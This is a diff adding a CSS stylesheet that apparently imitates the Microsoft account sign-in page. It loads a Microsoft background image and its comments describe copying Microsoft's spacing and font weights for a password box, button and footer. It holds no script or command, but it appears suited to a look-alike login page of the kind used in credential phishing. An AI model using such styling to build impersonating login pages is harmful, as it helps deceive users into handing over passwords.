@@ -1,0 +1,368 @@
+
+body {
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+    line-height: 20px;
+    font-weight: 400;
+    font-size: .9375rem;
+    line-height: 1.25rem;
+    background: url(https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg)  no-repeat fixed center; 
+    background-size: cover;
+    margin: 0;
+}
+a {
+    color: #0067b8;
+    text-decoration: none;
+    font-size: .8125rem;
+}
+.overlay {
+    background-color: #101010;
+    opacity: .1;
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    width: 100vw;
+    z-index: 0;
+}
+
+.ellipsis-btn {
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: bold;
+    display: inline-block;
+    padding-left: 10px; /* Separation from previous link */
+}
+
+.troubleshoot-box {
+    background: #fff;
+    border-top: 1px solid #ddd;
+    padding: 20px 0;
+    margin-top: 30px; /* Added separation from boilerplate */
+    text-align: left;
+}
+
+.debug-info p {
+    margin: 4px 0;
+    font-size: 14px;
+    color: #333;
+}
+.outer {
+    display: table;
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    z-index: 10;
+}
+.middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+.sign-in-box {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 400px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    min-width: 300px;
+    min-height: 300px;
+    overflow: hidden;
+}
+
+.win-scroll {
+    box-sizing: border-box;
+}
+
+
+/* Ensure the image inside doesn't inherit weird spacing */
+.logo img {
+  vertical-align: top;
+  border: 0;
+}
+.logo {
+    display: block;
+    margin-bottom: 14px;
+    /* Negative margin pulls it left to counteract SVG internal white space */
+    margin-left: -2px; 
+    text-align: left;
+}
+
+#logo_image {
+    width: 155px; /* Increased width to accommodate larger text */
+    height: 36px; /* Increased height */
+    display: block;
+}
+
+h2 {
+    font-size: 1.5rem;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-top: 0;
+}
+.display_name {
+    line-height: 24px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    margin-bottom: 15px;
+}
+.prompt {
+    color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 15px;
+}
+#error {
+    color: red;
+    display: none;
+}
+.passwordinput {
+    width: 100%;
+    height: 36px;
+    padding: 6px 0; /* Align text to the far left of the line */
+    background-color: transparent !important; /* Removes the gray background box */
+    border: none !important; /* Removes the top, left, and right borders */
+    border-bottom: 1px solid #666 !important; /* Keeps only the bottom line */
+    border-radius: 0;
+    box-sizing: border-box;
+    margin-bottom: 20px;
+    outline: none;
+    font-size: 15px;
+}
+
+
+/* Optional: Ensures the placeholder text matches the look */
+.passwordinput::placeholder {
+    color: #666;
+    opacity: 1;
+}
+.buttoncontainer {
+    /* Change from absolute to relative to keep it in the flow of the box */
+    position: relative; 
+    margin-top: 40px;
+    text-align: right;
+    margin-bottom: 20px; /* Added spacing below the button area */
+    width: 100%;
+    height: 36px;
+    display: block;
+    clear: both;
+}
+.button {
+    color: #fff;
+    border-color: #0067b8;
+    background-color: #0067b8;
+    display: block;
+    width: 120px;
+    cursor: pointer;
+    position: absolute;
+    right: 0px;
+    padding: 5px 14px 6px 14px;
+    
+    /* Animation Properties */
+    transition: transform 0.1s ease, background-color 0.2s ease;
+    outline: none;
+    border: none;
+}
+
+.button:hover {
+    border-color: #0055a6;
+    background-color: #0055a6;
+}
+
+/* The "Bump Click" Animation */
+.button:active {
+    transform: scale(0.96); /* Slightly shrinks the button */
+    background-color: #004a8b; /* Slightly darker blue on press */
+}
+
+.boilerplate-box {
+    display: block;
+    background-color: #f2f2f2 !important;
+    /* Pull the box to the edges of the white container */
+    margin-left: -44px;  
+    margin-right: -44px; 
+    margin-top: 20px;
+    
+    /* Add padding back inside so the text aligns with the "Next" button */
+    padding: 20px 44px;  
+    
+    text-align: left;
+    word-wrap: break-word;
+    clear: both;
+}
+
+.boilerplate-box p {
+    color: #1b1b1b;
+    font-size: 1rem;
+    line-height: 1.2rem;
+    font-weight: 400; /* Microsoft usually keeps this weight for boilerplate */
+    margin: 0;
+}
+
+/* Cleanup: remove the bottom padding from the main box so the grey sits flush */
+.sign-in-box {
+    height: auto;
+    min-height: 300px;
+    padding-bottom: 0px !important; 
+}
+
+/* Ensure links inside the grey text are also subtle or brand-consistent */
+.boilerplate-text a {
+    color: #0067b8;
+    text-decoration: none;
+}
+
+.boilerplate-text a:hover {
+    color: #666 !important; /* Change to gray */
+    text-decoration: underline !important;
+}
+
+/* Fix for the wrap-content class mentioned in your snippet */
+.wrap-content {
+    word-wrap: break-word;
+}
+
+.troubleshoot-box {
+    background: #fff;
+    border-top: 1px solid #ddd;
+    padding-top: 20px;
+    margin-top: 20px;
+    text-align: left;
+}
+
+
+
+.flag-section {
+    margin-top: 15px;
+    border-top: 1px solid #eee;
+    padding-top: 10px;
+}
+
+/* Password Box Style */
+.passwordinput {
+    width: 100%;
+    height: 36px;
+    padding: 6px 10px;
+    border: 1px solid #666; /* Defined box border */
+    border-radius: 0;
+    box-sizing: border-box;
+    margin-bottom: 15px;
+    outline: none;
+}
+
+.passwordinput:focus {
+    border-color: #0067b8; /* Brand blue on focus */
+}
+
+/* Pinned to bottom left */
+.footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    background-color: transparent;
+    padding: 5px 22px; /* Standard Microsoft spacing */
+    z-index: 20;
+    box-sizing: border-box;
+}
+
+.footertext {
+    text-align: left; /* Forces alignment to the left */
+}
+
+.footertext a, .footertext span {
+    color: #000;
+    font-size: 12px;
+    margin-right: 24px;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+.footertext a:hover {
+    color: #666 !important; /* Change to gray */
+    text-decoration: underline !important;
+}
+
+/* Fix for the troubleshoot box layout */
+.troubleshoot-container {
+    padding: 20px 44px !important;
+    min-height: auto !important;
+    max-height: 400px;
+    overflow-y: auto;
+}
+
+/* Ensure password box looks like a real input box */
+.passwordinput {
+    width: 100%;
+    height: 36px;
+    padding: 6px 10px;
+    border: 1px solid #666;
+    border-radius: 0;
+    box-sizing: border-box;
+    margin-bottom: 15px;
+    outline: none;
+    background-color: #fff;
+}
+
+.passwordinput:focus {
+    border-color: #0067b8;
+}
+
+
+/* Pinned to bottom right */
+.footer {
+    position: fixed;
+    bottom: 0;
+    right: 0; /* Changed from left: 0 to right: 0 */
+    width: auto; /* Changed from 100% to auto so it only takes needed space */
+    background-color: transparent;
+    padding: 12px 28px; 
+    z-index: 20;
+}
+
+.footertext {
+    text-align: right; /* Changed from left to right */
+}
+
+.footertext a, .footertext span {
+    color: #000;
+    font-size: 12px;
+    margin-left: 24px; /* Changed margin-right to margin-left to space items from the right edge */
+    margin-right: 0;
+    text-decoration: none;
+    cursor: pointer;
+}
+
+/* Universal Link Hover: Underline + Gray color */
+a:hover, .footertext a:hover, .copy-btn:hover {
+    color: #666 !important;
+    text-decoration: underline !important;
+}
+
+/* Make troubleshooting box shorter */
+.troubleshoot-container {
+    padding: 20px 44px !important;
+    min-height: auto !important;
+    max-height: 350px; /* Reduced height */
+}
+
+
+.copy-btn {
+    background: none;
+    border: none;
+    color: #0067b8;
+    cursor: pointer;
+    font-weight: 600;
+    padding: 0;
+    font-size: 14px;
+    text-decoration: none;
+}
+
